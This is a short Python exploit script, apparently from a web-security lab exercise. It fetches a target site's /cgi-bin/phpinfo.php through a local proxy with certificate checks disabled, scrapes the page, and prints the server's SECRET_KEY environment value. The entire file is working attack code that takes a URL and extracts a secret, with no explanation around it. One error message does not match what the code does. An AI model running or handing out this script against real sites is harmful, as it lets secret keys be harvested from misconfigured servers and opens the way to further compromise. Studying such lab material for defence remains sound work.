import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def information_disclosure_exploit(session, url) :
    exploit_url = url+"/cgi-bin/phpinfo.php"
    r = session.get(exploit_url, verify=False, proxies=proxies)
    
    if "SECRET_KEY" in r.text :
        # print(r.text)
        soup = BeautifulSoup(r.text, "html.parser")

        # Find the td element with the content "$_SERVER['SECRET_KEY']"
        secret_td = soup.find('td', string="$_SERVER['SECRET_KEY']")

        if secret_td:
            # Get the next td element, which contains the value
            value_td = secret_td.find_next('td', class_='v')
            
            if value_td:
                # Get the text content of the value_td
                secret_key = value_td.text
                print("Here is the secret key: " + secret_key)
            else:
                print("Value for $_SERVER['SECRET_KEY'] not found.")
        else:
            print("$_SERVER['SECRET_KEY'] element not found.")
    else :
        print("Failed to exploit the error message!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    information_disclosure_exploit(session, url)